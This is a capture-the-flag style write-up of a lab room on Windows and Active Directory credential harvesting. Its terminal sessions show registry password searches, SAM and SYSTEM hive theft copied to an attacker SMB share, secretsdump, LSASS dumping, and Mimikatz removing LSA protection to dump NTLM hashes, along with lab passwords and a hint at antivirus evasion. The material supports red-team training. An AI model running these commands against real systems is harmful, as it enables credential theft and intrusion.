---
Apply current authentication models employed in modern environments to a red team approach.
---

# Credentials Harvesting — Writeup

## Overview
### Credentials Harvesting — Writeup
### Credentials Harvesting — Writeup
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/1ab32f03262d2277c032ea836ef83bed.png)
### Introduction
Welcome to Credentials Harvesting
This room discusses the fundamental knowledge for red teamers taking advantage of obtained credentials to perform Lateral Movement and access resources within the AD environment. We will be showing how to obtain, reuse, and impersonate user credentials.
Credential harvesting consists of techniques for obtaining credentials like login information, account names, and passwords. It is a technique of extracting credential information from a system in various locations such as clear-text files, registry, memory dumping, etc.
As a red teamer, gaining access to legitimate credentials has benefits:
It can give access to systems (Lateral Movement).
It makes it harder to detect our actions.
It provides the opportunity to create and manage accounts to help achieve the end goals of a red team engagement.
Learning Objectives
Understand the method of extracting credentials from local windows (SAM database)
Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.
Introduction to Windows Credentials Manager and how to extract credentials.
Learn methods of extracting credentials for Domain Controller
Enumerate the Local Administrator Password Solution (LAPS) feature.
Introduction to AD attacks that lead to obtaining credentials.
Room Prerequisites
We strongly suggest finishing the following Active Directory rooms before diving into this room:
Jr. Penetration Tester Path
Active Directory Basics
Breaching AD
Enumerating AD
Lateral Movement and Pivoting
I have completed room prerequisites and am ready to learn about Credentials Harvesting!
### Credentials Harvesting
Credentials Harvesting
Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look for or steal stored credentials, including network sniffing, where an attacker captures transmitted credentials.
Credentials can be found in a variety of different forms, such as:
Accounts details (usernames and passwords)
Hashes that include NTLM hashes, etc.
Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
Any information that helps login into a system (private keys, etc.)
Generally speaking, there are two types of credential harvesting: external and internal. External credential harvesting most likely involves phishing emails and other techniques to trick a user into entering his username and password. If you want to learn more about phishing emails, we suggest trying the THM Phishing room. Obtaining credentials through the internal network uses different approaches.
In this room, the focus will be on harvesting credentials from an internal perspective where a threat actor has already compromised a system and gained initial access.
We have provided a Windows Server 2019 configured as a Domain Controller. To follow the content discussed in this room, deploy the machine and move on to the next task.
You can access the machine in-browser or through RDP using the credentials below.
Machine IP: MACHINE_IP            Username: thm         Password: Passw0rd!
Ensure to deploy the AttackBox as it is required in attacks discussed in this room.
### Credential Access
Credential Access
Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than exploiting systems using CVEs.
For more information, you may visit the MITRE ATT&CK framework ([TA0006](https://attack.mitre.org/tactics/TA0006/)).
Credentials are stored insecurely in various locations in systems:
Clear-text files
Database files
Memory
Password managers
Enterprise Vaults
Active Directory
Network Sniffing
Let's discuss them a bit more!
Clear-text files
Attackers may search a compromised machine for credentials in local or remote file systems. Clear-text files could include sensitive information created by a user, containing passwords, private keys, etc. The MITRE ATT&CK framework defines it as Unsecured Credentials: Credentials In Files (T1552.001).
The following are some of the types of clear-text files that an attacker may be interested in:
Commands history
Configuration files (Web App, FTP files, etc.)
Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
Backup files
Shared files and folders
Registry
Source code
As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.
```text
Looking for the "password" Keyword in the Registry

           
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```
Database Files
Applications utilize database files to read or write settings, configurations, or credentials. Database files are usually stored locally in Windows operating systems. These files are an excellent target to check and hunt for credentials. For more information, we suggest checking THM room: Breaching AD. It contains a showcase example of extracting credentials from the local McAfee Endpoint database file.
Password Managers
A password manager is an application to store and manage users' login information for local and Internet websites and services. Since it deals with users' data, it must be stored securely to prevent unauthorized access.
Examples of Password Manager applications:
Built-in password managers (Windows)
Third-party: KeePass, 1Password, LastPass
However, misconfiguration and security flaws are found in these applications that let adversaries access stored data. Various tools could be used during the enumeration stage to get sensitive data in password manager applications used by Internet browsers and desktop applications.
This room will discuss how to access the Windows Credentials manager and extract passwords.
Memory Dump
The Operating system's memory is a rich source of sensitive information that belongs to the Windows OS, users, and other applications. Data gets loaded into memory at run time or during the execution. Thus, accessing memory is limited to administrator users who fully control the system.
The following are examples of memory stored sensitive data, including:
Clear-text credentials
Cached passwords
AD Tickets
In this room, we will discuss how to get access to memory and extract clear-text passwords and authentication tickets.
Active Directory
Active Directory stores a lot of information related to users, groups, computers, etc. Thus, enumerating the Active Directory environment is one of the focuses of red team assessments. Active Directory has a solid design, but misconfiguration made by admins makes it vulnerable to various attacks shown in this room.
The following are some of the Active Directory misconfigurations that may leak users' credentials.
Users' description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access.
Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for more information about the vulnerable version of SYSVOL.
NTDS: Contains AD users' credentials, making it a target for attackers.
AD Attacks: Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.
Network Sniffing
Gaining initial access to a target network enables attackers to perform various network attacks against local computers, including the AD environment. The Man-In-the-Middle attack against network protocols lets the attacker create a rogue or spoof trusted resources within the network to steal authentication information such as NTLM hashes.
Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Use findstr to grep THM text only
```text
PS C:\Users\thm> reg query HKLM /f password /t REG_SZ /s | findstr flag
    flag    REG_SZ    password: 7tyh4ckm3
```
*7tyh4ckm3*
Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```text
PS C:\Users\thm> Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

Name          SamAccountName Description
----          -------------- -----------
Administrator Administrator  Built-in account for administering the computer/domain
Guest         Guest          Built-in account for guest access to the computer/domain
krbtgt        krbtgt         Key Distribution Center Service Account
THM User      thm
THM Victim    victim         Change the password: Passw0rd!@#
thm-local     thm-local
Admin THM     admin
svc-thm       svc-thm
THM Admin BK  bk-admin
test          test-user
sshd          sshd
```
*Passw0rd!@#*
### Local Windows Credentials
In general, Windows operating system provides two types of user accounts: Local and Domain. Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory. This task discusses credentials for local user accounts and demonstrates how they can be obtained.
Keystrokes
Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. However, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can perform keylogging using tools like the Metasploit framework or others.
We have a use case example for exploiting users via keystrokes using Metasploit in another THM room. For more information, you should check THM Exploiting AD (Task 5).
Security Account Manager (SAM)
The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. Moreover, it can not be read and accessed by any users while the Windows operating system is running. However, there are various ways and attacks to dump the content of the SAM database.
First, ensure you have deployed the provided VM and then confirm we are not able to copy or read  the c:\Windows\System32\config\sam file:
```text
Confirming No Access to the SAM Database

 
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```
Metasploit's HashDump
The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. For more information about hashdump, you can visit the rapid7 blog. We will discuss dumping credentials directly from the LSASS.exe process in another task!
```text
Dumping the SAM database content
```
```text
meterpreter > getuid
Server username: THM\Administrator
```
```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```
Volume Shadow Copy Service
The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the Microsoft documentation page for more information about the service.
More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,
Run the standard cmd.exe prompt with administrator privileges.
Execute the wmic command to create a copy shadow of C: drive
Verify the creation from step 2 is available.
Copy the SAM database from the volume we created in step 2
Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:
```text
Creating a Shadow Copy of Volume C with WMIC

           
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```
Once the command is successfully executed, let's use the vssadmin, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the C: volume.
```text
Listing the Available Shadow Volumes

           
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```
The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1.
As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system.
Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,
```text
Copying the SAM and SYSTEM file from the Shadow Volume

           
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```
Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).
Registry Hives
Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.
```text
Save SAM and SYSTEM files from the registry

           
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```
Let's this time decrypt it using one of the Impacket tools: secretsdump.py, which is already installed in the AttackBox. The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.
Move both SAM and system files to the AttackBox and run the following command:
```text
Decrypting SAM Database using Impacket SecretsDump Script Locally

           
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
Note that we used the SAM and System files that we extracted from Windows Registry. The -sam argument is to specify the path for the dumped sam file from the Windows machine. The -system argument is for a path for the system file. We used the LOCAL argument at the end of the command to decrypt the Local SAM file as this tool handles other types of decryption.
Note if we compare the output against the NTLM hashes we got from Metasploit's Hashdump, the result is different. The reason is the other accounts belong to Active Directory, and their information is not stored in the System file we have dumped. To Decrypt them, we need to dump the SECURITY file from the Windows file, which contains the required files to decrypt Active Directory accounts.
Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use different techniques to impersonate users using the hashes.
Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?
```text
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username thm -password Passw0rd! public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.206.16,62382)
[*] AUTHENTICATE_MESSAGE (THM\thm,CREDS-HARVESTIN)
[*] User CREDS-HARVESTIN\thm authenticated successfully
[*] thm::THM:aaaaaaaaaaaaaaaa:3d1070a2a810942d76122316a92c67ff:0101000000000000806059aff8cad80110d365d5250bb7f300000000010010006b006100620078005100530067004200030010006b00610062007800510053006700420002001000420068006300510041004c004400680004001000420068006300510041004c004400680007000800806059aff8cad801060004000200000008003000300000000000000000000000003000002f2f098dc2133b7b2d5fdc51cba1f996021e335aa7cf515e43d99fb5464104380a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.206.16,62382)
[*] Remaining connections []
[*] Incoming connection (10.10.206.16,62387)
[*] AUTHENTICATE_MESSAGE (THM\thm,CREDS-HARVESTIN)
[*] User CREDS-HARVESTIN\thm authenticated successfully
[*] thm::THM:aaaaaaaaaaaaaaaa:ff110b588da376e97b4896f1fe87dfc0:010100000000000080306cc2f8cad801648915deb66368f900000000010010006b006100620078005100530067004200030010006b00610062007800510053006700420002001000420068006300510041004c004400680004001000420068006300510041004c00440068000700080080306cc2f8cad801060004000200000008003000300000000000000000000000003000002f2f098dc2133b7b2d5fdc51cba1f996021e335aa7cf515e43d99fb5464104380a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.206.16,62387)
[*] Remaining connections []

C:\Windows\system32>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{3F8FA3D4-E3B9-40B7-BA94-5293E4763D9F}";
};

C:\Windows\system32>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {ac31f611-ff51-4dc3-9c88-fa16cc365292}
   Contained 1 shadow copies at creation time: 9/18/2022 12:40:59 AM
      Shadow Copy ID: {3f8fa3d4-e3b9-40b7-ba94-5293e4763d9f}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential

C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam
        1 file(s) copied.

C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\thm\Desktop\system
        1 file(s) copied.
        
C:\Windows\system32>copy "C:\Users\thm\Desktop\sam" \\10.11.81.220\public\
        1 file(s) copied.

C:\Windows\system32>copy "C:\Users\thm\Desktop\system" \\10.11.81.220\public\
        1 file(s) copied.

──(kali㉿kali)-[~/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL     
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
*98d3a787a80d08385cea7fb4aa2a4261*
### Local Security Authority Subsystem Service (LSASS).
What is the LSASS?
Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.
Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. Luckily for us, if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as "[OS Credential Dumping: LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/)".
Graphic User Interface (GUI)
To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".
Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline.
Note: if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the Protected LSASS section later in this task.
Copy the dumped process to the Mimikatz folder.
```text
Copying the LSASS Dumped file

           
C:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
        1 file(s) copied.
```
Sysinternals Suite
An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite is already installed in the provided machine at the following path: c:\Tools\SysinternalsSuite
We can specify a running process, which in our case is lsass.exe, to be dumped as follows,
```text
Dumping the LSASS Process using procdump.exe 

           
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
[09:09:34] Dump count reached.
```
Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.
MimiKatz
[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.
We will be using the Mimikatz tool to extract the memory dump of the lsass.exe process. We have provided the necessary tools for you, and they can be found at: c:\Tools\Mimikatz.
Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,
```text
Runing mimikatz With Admin Privielges

           
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz #
```
Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing privilege::debug command as follows,
```text
Checking the Current Permission to Access Memory 

           
mimikatz # privilege::debug
Privilege '20' OK
```
Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the lsass.exe process using sekurlsa::logonpasswords. If we try this on the provided VM, it will not work until we fix it in the next section.
```text
Dumping the Stored Clear-text Passwords

           
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/3/2022 8:30:44 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...
```
Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash.
Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.
Protected LSASS
In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.
The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
```text
Failing to Dump Stored Password Due to the LSA Protection

           
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```
The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
```text
Loading the mimidrv Driver into Memory

           
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```
Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.
Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
```text
Removing the LSA Protection

           
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```
Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.
Is the LSA protection enabled? (Y|N)
*Y*
```text
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\

c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

Error opening lsass.exe (832):
Access is denied. (0x00000005, 5)

c:\>cd Users\Administrator

c:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
The system cannot find the path specified.

c:\Users\Administrator>cd C:\Tools\Mimikatz

C:\Tools\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started

mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 832 -> 00/00 [0-0-0]

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 746421 (00000000:000b63b5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:30 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
        ssp :
        credman :

Authentication Id : 0 ; 744851 (00000000:000b5d93)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:29 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
        tspkg :
        wdigest :
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * Password : (null)
        kerberos :
         * Username : CREDS-HARVESTIN$
         * Domain   : thm.red
         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
        ssp :
        credman :

Authentication Id : 0 ; 744759 (00000000:000b5d37)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/26/2022 4:16:29 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : CREDS-HARVESTIN$
         * Domain   : THM
         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
